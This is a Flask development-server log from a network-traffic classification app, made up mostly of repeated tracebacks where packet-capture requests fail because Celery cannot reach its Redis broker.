nohup: ignoring input
Matplotlib created a temporary config/cache directory at /tmp/matplotlib-wrusud12 because the default path (/home/ubuntu/.config/matplotlib) is not a writable directory; it is highly recommended to set the MPLCONFIGDIR environment variable to a writable directory, in particular to speed up the import of Matplotlib and to better support multiprocessing.
 * Serving Flask app "main.APP_Initial" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on http://0.0.0.0:8000/ (Press CTRL+C to quit)
113.57.237.25 - - [21/May/2021 13:32:08] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:32:08] "[37mPOST /login HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:32:10] "[37mGET /dataSet?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:33:59] "[37mOPTIONS /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 200 -
[2021-05-21 13:34:18,657] ERROR in app: Exception on /PackageCapture [GET]
Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 559, in connect
    sock = self._connect()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 615, in _connect
    raise err
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 603, in _connect
    sock.connect(socket_address)
OSError: [Errno 113] No route to host

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 117, in reconnect_on_error
    yield
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 167, in _consume_from
    self._pubsub.subscribe(key)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/client.py", line 3580, in subscribe
    ret_val = self.execute_command('SUBSCRIBE', *iterkeys(new_channels))
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/client.py", line 3468, in execute_command
    self.shard_hint
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 1192, in get_connection
    connection.connect()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 563, in connect
    raise ConnectionError(self._error_message(e))
redis.exceptions.ConnectionError: Error 113 connecting to 122.51.255.207:6379. No route to host.

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 559, in connect
    sock = self._connect()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 615, in _connect
    raise err
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 603, in _connect
    sock.connect(socket_address)
OSError: [Errno 113] No route to host

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/kombu/connection.py", line 448, in _reraise_as_library_errors
    yield
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/app/base.py", line 748, in send_task
    self.backend.on_task_call(P, task_id)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 343, in on_task_call
    self.result_consumer.consume_from(task_id)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 159, in consume_from
    return self.start(task_id)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 137, in start
    self._consume_from(initial_task_id)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 167, in _consume_from
    self._pubsub.subscribe(key)
  File "/usr/lib/python3.6/contextlib.py", line 99, in __exit__
    self.gen.throw(type, value, traceback)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 120, in reconnect_on_error
    self._ensure(self._reconnect_pubsub, ())
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 357, in ensure
    **retry_policy)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/kombu/utils/functional.py", line 325, in retry_over_time
    return fun(*args, **kwargs)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 105, in _reconnect_pubsub
    metas = self.backend.client.mget(self.subscribed_to)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/client.py", line 1671, in mget
    return self.execute_command('MGET', *args, **options)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/client.py", line 898, in execute_command
    conn = self.connection or pool.get_connection(command_name, **options)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 1192, in get_connection
    connection.connect()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 563, in connect
    raise ConnectionError(self._error_message(e))
redis.exceptions.ConnectionError: Error 113 connecting to 122.51.255.207:6379. No route to host.

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask_cors/extension.py", line 165, in wrapped_function
    return cors_after_request(app.make_response(f(*args, **kwargs)))
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
    reraise(exc_type, exc_value, tb)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
    raise value
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
    return self.view_functions[rule.endpoint](**req.view_args)
  File "server.py", line 873, in getPackage
    netpackage_capture.apply_async(kwargs={'username': username}, priority=priority)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/app/task.py", line 565, in apply_async
    **options
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/app/base.py", line 749, in send_task
    amqp.send_task_message(P, name, message, **options)
  File "/usr/lib/python3.6/contextlib.py", line 99, in __exit__
    self.gen.throw(type, value, traceback)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/kombu/connection.py", line 452, in _reraise_as_library_errors
    raise ConnectionError(str(exc)) from exc
kombu.exceptions.OperationalError: Error 113 connecting to 122.51.255.207:6379. No route to host.
113.57.237.25 - - [21/May/2021 13:34:18] "[35m[1mGET /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 500 -
113.57.237.25 - - [21/May/2021 13:34:20] "[37mOPTIONS /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 200 -
[2021-05-21 13:34:43,444] ERROR in app: Exception on /PackageCapture [GET]
Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 559, in connect
    sock = self._connect()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 615, in _connect
    raise err
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 603, in _connect
    sock.connect(socket_address)
OSError: [Errno 113] No route to host

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 117, in reconnect_on_error
    yield
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 167, in _consume_from
    self._pubsub.subscribe(key)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/client.py", line 3580, in subscribe
    ret_val = self.execute_command('SUBSCRIBE', *iterkeys(new_channels))
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/client.py", line 3468, in execute_command
    self.shard_hint
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 1192, in get_connection
    connection.connect()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 563, in connect
    raise ConnectionError(self._error_message(e))
redis.exceptions.ConnectionError: Error 113 connecting to 122.51.255.207:6379. No route to host.

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 559, in connect
    sock = self._connect()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 615, in _connect
    raise err
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 603, in _connect
    sock.connect(socket_address)
OSError: [Errno 113] No route to host

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/kombu/connection.py", line 448, in _reraise_as_library_errors
    yield
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/app/base.py", line 748, in send_task
    self.backend.on_task_call(P, task_id)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 343, in on_task_call
    self.result_consumer.consume_from(task_id)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 159, in consume_from
    return self.start(task_id)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 137, in start
    self._consume_from(initial_task_id)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 167, in _consume_from
    self._pubsub.subscribe(key)
  File "/usr/lib/python3.6/contextlib.py", line 99, in __exit__
    self.gen.throw(type, value, traceback)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 120, in reconnect_on_error
    self._ensure(self._reconnect_pubsub, ())
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 357, in ensure
    **retry_policy)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/kombu/utils/functional.py", line 325, in retry_over_time
    return fun(*args, **kwargs)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 105, in _reconnect_pubsub
    metas = self.backend.client.mget(self.subscribed_to)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/client.py", line 1671, in mget
    return self.execute_command('MGET', *args, **options)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/client.py", line 898, in execute_command
    conn = self.connection or pool.get_connection(command_name, **options)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 1192, in get_connection
    connection.connect()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 563, in connect
    raise ConnectionError(self._error_message(e))
redis.exceptions.ConnectionError: Error 113 connecting to 122.51.255.207:6379. No route to host.

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask_cors/extension.py", line 165, in wrapped_function
    return cors_after_request(app.make_response(f(*args, **kwargs)))
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
    reraise(exc_type, exc_value, tb)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
    raise value
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
    return self.view_functions[rule.endpoint](**req.view_args)
  File "server.py", line 873, in getPackage
    netpackage_capture.apply_async(kwargs={'username': username}, priority=priority)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/app/task.py", line 565, in apply_async
    **options
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/app/base.py", line 749, in send_task
    amqp.send_task_message(P, name, message, **options)
  File "/usr/lib/python3.6/contextlib.py", line 99, in __exit__
    self.gen.throw(type, value, traceback)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/kombu/connection.py", line 452, in _reraise_as_library_errors
    raise ConnectionError(str(exc)) from exc
kombu.exceptions.OperationalError: Error 113 connecting to 122.51.255.207:6379. No route to host.
113.57.237.25 - - [21/May/2021 13:34:43] "[35m[1mGET /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 500 -
113.57.237.25 - - [21/May/2021 13:34:44] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:34:44] "[37mPOST /login HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:34:45] "[37mGET /dataSet?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:34:47] "[37mOPTIONS /personalLog HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:34:47] "[37mPOST /personalLog HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:34:49] "[37mGET /ClassifyRecords?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:34:51] "[37mGET /dataSet?page=1&limit=10 HTTP/1.1[0m" 200 -
113.57.237.25 - - [21/May/2021 13:34:57] "[37mOPTIONS /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 200 -
[2021-05-21 13:35:16,397] ERROR in app: Exception on /PackageCapture [GET]
Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 559, in connect
    sock = self._connect()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 615, in _connect
    raise err
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 603, in _connect
    sock.connect(socket_address)
OSError: [Errno 113] No route to host

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 117, in reconnect_on_error
    yield
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 167, in _consume_from
    self._pubsub.subscribe(key)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/client.py", line 3580, in subscribe
    ret_val = self.execute_command('SUBSCRIBE', *iterkeys(new_channels))
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/client.py", line 3468, in execute_command
    self.shard_hint
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 1192, in get_connection
    connection.connect()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 563, in connect
    raise ConnectionError(self._error_message(e))
redis.exceptions.ConnectionError: Error 113 connecting to 122.51.255.207:6379. No route to host.

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 559, in connect
    sock = self._connect()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 615, in _connect
    raise err
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 603, in _connect
    sock.connect(socket_address)
OSError: [Errno 113] No route to host

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/kombu/connection.py", line 448, in _reraise_as_library_errors
    yield
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/app/base.py", line 748, in send_task
    self.backend.on_task_call(P, task_id)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 343, in on_task_call
    self.result_consumer.consume_from(task_id)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 159, in consume_from
    return self.start(task_id)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 137, in start
    self._consume_from(initial_task_id)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 167, in _consume_from
    self._pubsub.subscribe(key)
  File "/usr/lib/python3.6/contextlib.py", line 99, in __exit__
    self.gen.throw(type, value, traceback)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 120, in reconnect_on_error
    self._ensure(self._reconnect_pubsub, ())
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 357, in ensure
    **retry_policy)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/kombu/utils/functional.py", line 325, in retry_over_time
    return fun(*args, **kwargs)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 105, in _reconnect_pubsub
    metas = self.backend.client.mget(self.subscribed_to)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/client.py", line 1671, in mget
    return self.execute_command('MGET', *args, **options)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/client.py", line 898, in execute_command
    conn = self.connection or pool.get_connection(command_name, **options)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 1192, in get_connection
    connection.connect()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 563, in connect
    raise ConnectionError(self._error_message(e))
redis.exceptions.ConnectionError: Error 113 connecting to 122.51.255.207:6379. No route to host.

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask_cors/extension.py", line 165, in wrapped_function
    return cors_after_request(app.make_response(f(*args, **kwargs)))
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
    reraise(exc_type, exc_value, tb)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
    raise value
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
    return self.view_functions[rule.endpoint](**req.view_args)
  File "server.py", line 873, in getPackage
    netpackage_capture.apply_async(kwargs={'username': username}, priority=priority)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/app/task.py", line 565, in apply_async
    **options
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/app/base.py", line 749, in send_task
    amqp.send_task_message(P, name, message, **options)
  File "/usr/lib/python3.6/contextlib.py", line 99, in __exit__
    self.gen.throw(type, value, traceback)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/kombu/connection.py", line 452, in _reraise_as_library_errors
    raise ConnectionError(str(exc)) from exc
kombu.exceptions.OperationalError: Error 113 connecting to 122.51.255.207:6379. No route to host.
113.57.237.25 - - [21/May/2021 13:35:16] "[35m[1mGET /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 500 -
113.57.237.25 - - [21/May/2021 13:35:27] "[37mOPTIONS /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 200 -
[2021-05-21 13:35:47,438] ERROR in app: Exception on /PackageCapture [GET]
Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 559, in connect
    sock = self._connect()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 615, in _connect
    raise err
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 603, in _connect
    sock.connect(socket_address)
OSError: [Errno 113] No route to host

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 117, in reconnect_on_error
    yield
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 167, in _consume_from
    self._pubsub.subscribe(key)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/client.py", line 3580, in subscribe
    ret_val = self.execute_command('SUBSCRIBE', *iterkeys(new_channels))
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/client.py", line 3468, in execute_command
    self.shard_hint
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 1192, in get_connection
    connection.connect()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 563, in connect
    raise ConnectionError(self._error_message(e))
redis.exceptions.ConnectionError: Error 113 connecting to 122.51.255.207:6379. No route to host.

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 559, in connect
    sock = self._connect()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 615, in _connect
    raise err
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 603, in _connect
    sock.connect(socket_address)
OSError: [Errno 113] No route to host

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/kombu/connection.py", line 448, in _reraise_as_library_errors
    yield
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/app/base.py", line 748, in send_task
    self.backend.on_task_call(P, task_id)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 343, in on_task_call
    self.result_consumer.consume_from(task_id)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 159, in consume_from
    return self.start(task_id)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 137, in start
    self._consume_from(initial_task_id)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 167, in _consume_from
    self._pubsub.subscribe(key)
  File "/usr/lib/python3.6/contextlib.py", line 99, in __exit__
    self.gen.throw(type, value, traceback)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 120, in reconnect_on_error
    self._ensure(self._reconnect_pubsub, ())
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 357, in ensure
    **retry_policy)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/kombu/utils/functional.py", line 325, in retry_over_time
    return fun(*args, **kwargs)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 105, in _reconnect_pubsub
    metas = self.backend.client.mget(self.subscribed_to)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/client.py", line 1671, in mget
    return self.execute_command('MGET', *args, **options)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/client.py", line 898, in execute_command
    conn = self.connection or pool.get_connection(command_name, **options)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 1192, in get_connection
    connection.connect()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 563, in connect
    raise ConnectionError(self._error_message(e))
redis.exceptions.ConnectionError: Error 113 connecting to 122.51.255.207:6379. No route to host.

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask_cors/extension.py", line 165, in wrapped_function
    return cors_after_request(app.make_response(f(*args, **kwargs)))
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
    reraise(exc_type, exc_value, tb)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
    raise value
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
    return self.view_functions[rule.endpoint](**req.view_args)
  File "server.py", line 873, in getPackage
    netpackage_capture.apply_async(kwargs={'username': username}, priority=priority)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/app/task.py", line 565, in apply_async
    **options
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/app/base.py", line 749, in send_task
    amqp.send_task_message(P, name, message, **options)
  File "/usr/lib/python3.6/contextlib.py", line 99, in __exit__
    self.gen.throw(type, value, traceback)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/kombu/connection.py", line 452, in _reraise_as_library_errors
    raise ConnectionError(str(exc)) from exc
kombu.exceptions.OperationalError: Error 113 connecting to 122.51.255.207:6379. No route to host.
113.57.237.25 - - [21/May/2021 13:35:47] "[35m[1mGET /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 500 -
113.57.237.25 - - [21/May/2021 13:36:10] "[37mOPTIONS /PackageCapture?username=feifei&userdegree=Advanced HTTP/1.1[0m" 200 -
[2021-05-21 13:36:29,932] ERROR in app: Exception on /PackageCapture [GET]
Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 559, in connect
    sock = self._connect()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 615, in _connect
    raise err
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 603, in _connect
    sock.connect(socket_address)
OSError: [Errno 113] No route to host

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 117, in reconnect_on_error
    yield
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 167, in _consume_from
    self._pubsub.subscribe(key)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/client.py", line 3580, in subscribe
    ret_val = self.execute_command('SUBSCRIBE', *iterkeys(new_channels))
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/client.py", line 3468, in execute_command
    self.shard_hint
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 1192, in get_connection
    connection.connect()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 563, in connect
    raise ConnectionError(self._error_message(e))
redis.exceptions.ConnectionError: Error 113 connecting to 122.51.255.207:6379. No route to host.

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 559, in connect
    sock = self._connect()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 615, in _connect
    raise err
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 603, in _connect
    sock.connect(socket_address)
OSError: [Errno 113] No route to host

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/kombu/connection.py", line 448, in _reraise_as_library_errors
    yield
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/app/base.py", line 748, in send_task
    self.backend.on_task_call(P, task_id)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 343, in on_task_call
    self.result_consumer.consume_from(task_id)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 159, in consume_from
    return self.start(task_id)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 137, in start
    self._consume_from(initial_task_id)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 167, in _consume_from
    self._pubsub.subscribe(key)
  File "/usr/lib/python3.6/contextlib.py", line 99, in __exit__
    self.gen.throw(type, value, traceback)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 120, in reconnect_on_error
    self._ensure(self._reconnect_pubsub, ())
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 357, in ensure
    **retry_policy)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/kombu/utils/functional.py", line 325, in retry_over_time
    return fun(*args, **kwargs)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/backends/redis.py", line 105, in _reconnect_pubsub
    metas = self.backend.client.mget(self.subscribed_to)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/client.py", line 1671, in mget
    return self.execute_command('MGET', *args, **options)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/client.py", line 898, in execute_command
    conn = self.connection or pool.get_connection(command_name, **options)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 1192, in get_connection
    connection.connect()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/redis/connection.py", line 563, in connect
    raise ConnectionError(self._error_message(e))
redis.exceptions.ConnectionError: Error 113 connecting to 122.51.255.207:6379. No route to host.

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask_cors/extension.py", line 165, in wrapped_function
    return cors_after_request(app.make_response(f(*args, **kwargs)))
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
    reraise(exc_type, exc_value, tb)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
    raise value
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/ubuntu/.local/lib/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
    return self.view_functions[rule.endpoint](**req.view_args)
  File "server.py", line 873, in getPackage
    netpackage_capture.apply_async(kwargs={'username': username}, priority=priority)
  File "/home/ubuntu/.local/lib/python3.6/site-packages/celery/app/task.py", line 565, in apply_async
    **options
